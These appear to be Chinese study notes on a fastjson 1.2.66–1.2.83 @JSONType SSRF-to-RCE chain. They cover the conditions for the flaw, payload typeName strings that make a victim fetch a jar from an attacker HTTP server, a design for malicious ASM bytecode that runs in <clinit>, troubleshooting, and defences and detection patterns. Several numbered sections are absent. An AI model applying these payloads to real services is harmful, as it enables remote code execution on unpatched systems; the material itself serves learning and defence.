Fastjson 1.2.66–1.2.83 JsonType SSRF → RCE 漏洞学习笔记

复现环境：JDK 8u202 + fastjson 1.2.83 + Spring Boot Loader 2.7.18
复现日期：2026-07-21

一、漏洞背景

1.1 历史脉络

fastjson 从 1.2.24 开始频繁爆出反序列化 RCE，官方逐步引入：

版本 防御措施
1.2.25 引入 AutoTypeSupport（默认关闭）+ 黑名单
1.2.42 黑名单改为哈希，增加 expectClass 校验
1.2.66 引入 @JSONType 注解资源探测——如果字节码含此注解，视为可信类型
1.2.68 引入 safeMode（默认关闭），开启后完全禁用 AutoType

本次漏洞的时间线：

  • 1.2.66 引入了 @JSONType 资源探测逻辑，初衷是在 AutoType 关闭时仍能”信任”带注解的内部类型
  • 该逻辑在 1.2.66 – 1.2.83 间一直存在
  • 2025 年安全研究者发现：如果目标 ClassLoader 能解析 jar:http: URL，这个”信任机制”就会变成一个完整的 SSRF → RCE 利用链
  • 1.2.84+ 修复了此问题

1.2 影响范围

条件 说明
fastjson 1.2.66 – 1.2.83
ClassLoader Spring Boot FatJar 的 LaunchedURLClassLoader，或任何能解析 jar:http: URL 的 ClassLoader
JDK 完整 RCE 需 JDK 8；JDK 9+ 仅能 SSRF（ClassFormatError 阻断 defineClass）
AutoType 关闭亦可——攻击走 @JSONType 信任分支
SafeMode 若开启（-Dfastjson.parser.safeMode=true）则完全免疫

1.3 与历史漏洞的本质区别

历史链（JdbcRowSetImpl 等） 本链（JsonType）
入口 @type + 黑名单绕过 @type 被拼成 资源 URL
依赖 gadget JdbcRowSetImpl / TemplatesImpl 等 无经典 gadget
执行点 反序列化 setter / JNDI 回调 **远程类 <clinit>**（parse 阶段自动执行）
防护绕过 绕过黑名单 绕过 AutoType（@JSONType 信任分支）

4.2 Payload 构造原理

typeName 必须满足：经过 replace('.','/') 后变成一个合法的 jar:http URL。

两个 Payload 变体：

变体 typeName 特点
localhost jar:http:..localhost:18080.probe!.POC localhost 无点，不被替换
整数 IP jar:http:..2130706433:18080.probe!.POC 2130706433 = 127.0.0.1 的整数形式，无点不受影响

4.3 恶意字节码设计（CraftProbe / GenExec）

ASM 生成的特殊 class 文件必须同时满足三个条件：

设计点 实现 目的
① internal name = jar:http URL ClassWriter.visit(..., "jar:http://localhost:18080/probe!/POC", ...) 使得 typeName → resource → URL 形成闭环
② 带 @JSONType 注解 visitor.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true) 通过 checkAutoType 的信任检查
③ 攻击载荷在 <clinit> MethodVisitor.visitMethod(ACC_STATIC, "<clinit>", ...) 类加载时自动执行，无需业务代码二次触发

为什么选 <clinit> 而非其他？

  • <clinit>：类被 defineClass 时 JVM 自动执行，无需任何业务代码调用
  • <init>（构造函数）：需要 new Foo()，parse 阶段不保证调用
  • 普通方法 / setter：不可控调用时机

4.4 fastjson 为什么内置 ASM？

fastjson 1.2.66+ 在自身 jar 内包含了一份 shaded ASM（com.alibaba.fastjson.asm.*），用于：

  1. 序列化优化：ASMSerializerFactory 动态生成序列化器字节码，提升性能
  2. @JSONType 扫描：checkAutoType 中通过 ASMUtils / ASMClassLoader 检查字节码注解

所以目标环境不需要额外引入 ASM——fastjson 自带的 ASM 就是 @JSONType 资源探测的引擎。

六、失败原因分析

6.1 JDK 版本不匹配

现象： JDK 9+（含 JDK 21）运行时报 ClassFormatError

原因： JDK 9 强化了 defineClass 的 internal name 校验，不允许 class 文件名中含有 ://、! 等非法字符。

影响： defineClass 失败 → TypeUtils.loadClass 抛异常 → fastjson 进入异常处理 → 输出 autoType is not support。

注意： 即使 RCE 失败，SSRF（HTTP GET 拉取 jar）在 checkAutoType 阶段已经发生。仅靠升级 JDK 不能消除 SSRF。

6.2 ClassLoader 不是 LaunchedURLClassLoader

现象： 普通 classpath 运行时无 SSRF

原因： AppClassLoader（sun.misc.Launcher$AppClassLoader）不能解析 jar:http: URL 协议。getResourceAsStream("jar:http://...") 返回 null。

实际业务中的情况： Spring Boot FatJar 部署的应用，运行时 ClassLoader 默认就是 LaunchedURLClassLoader。

6.3 SafeMode 已开启

现象： safeMode not support autoType

原因： ParserConfig.setSafeMode(true) 或 JVM 参数 -Dfastjson.parser.safeMode=true 会在 checkAutoType 的最开始直接抛出异常，不会走到资源探测逻辑。

这是最有效的防御手段。

6.4 类缓存导致 <clinit> 不重复执行

现象： 第二次攻击时 Victim 返回 200 OK，但 <clinit> 没有执行

原因：

  1. JVM 规范保证每个类的 <clinit> 只执行一次
  2. 第一次攻击成功时，LaunchedURLClassLoader 已将类加载到 JVM 并缓存
  3. 后续 JSON.parse 同一个 typeName 时，TypeUtils.loadClass 从缓存返回已有的 Class 对象
  4. <clinit> 不再执行

解决办法： 重启 Victim JVM 进程（清空类缓存）。

6.5 Probe HTTP 服务未启动或 jar 不一致

现象： Victim 返回 500 或连接超时

原因：

  • 攻击者 HTTP 服务未启动，Victim 无法连接 localhost:18080
  • ProbeHttpd 已启动但服务的 jar 字节是旧的（类加载后 <clinit> 行为与预期不符）

解决办法：

  1. 确认 Victim 能访问 127.0.0.1:18080
  2. 修改 probe_exec.jar 后重启 ProbeHttpd（它会将 jar 读入内存）
  3. 同时重启 Victim（清空 JVM 类缓存）

6.6 macOS 系统代理拦截

现象： 使用整数 IP 2130706433 时 getResource=null

原因： macOS 系统 HTTP 代理可能将整数 IP 流量转发到代理服务器，导致无法连通本地 probe。

解决办法：

  • 使用 -Dpoc.hostToken=localhost（localhost 不含点，且不受代理影响）
  • 或设置 -Dhttp.nonProxyHosts=* 禁用代理

七、防御建议

优先级 措施 效果
★★★ -Dfastjson.parser.safeMode=true 完全免疫
★★★ 迁移到 fastjson2 架构不同，不受此问题影响
★★☆ 不解析不可信来源的 JSON 从源头消除
★★☆ 升级 JDK 9+（组织级） 阻断 defineClass → RCE，但不能阻断 SSRF
★☆☆ 出站网络收敛 阻断 jar:http: URL 的 HTTP 回连
★☆☆ 监控 @type 中 jar:、!、..、整数 IP 等模式 攻击检测

九、核心经验总结

  1. AutoType 关闭≠安全：@JSONType 资源探测在 AutoType 检查之前执行，形成侧信道
  2. “无 gadget”本质是换了 gadget：传统 gadget 是 JdbcRowSetImpl 等 Java 类，这次 gadget 是 LaunchedURLClassLoader 的 jar:http 解析能力——一个”基础设施级”的 gadget
  3. ASM 是 fastjson 自己带的：不要被 PoC 的 pom.xml 误导——asm-9.6.jar 只是构建工具，目标环境只需 fastjson 自身
  4. <clinit> 是最终执行点：无需业务代码二次操作，类加载即触发，是最干净的 RCE 方式
  5. SSRF 和 RCE 是两个独立阶段：checkAutoType 阶段触发 SSRF，loadClass 阶段触发 RCE。JDK 9+ 只能阻断后者
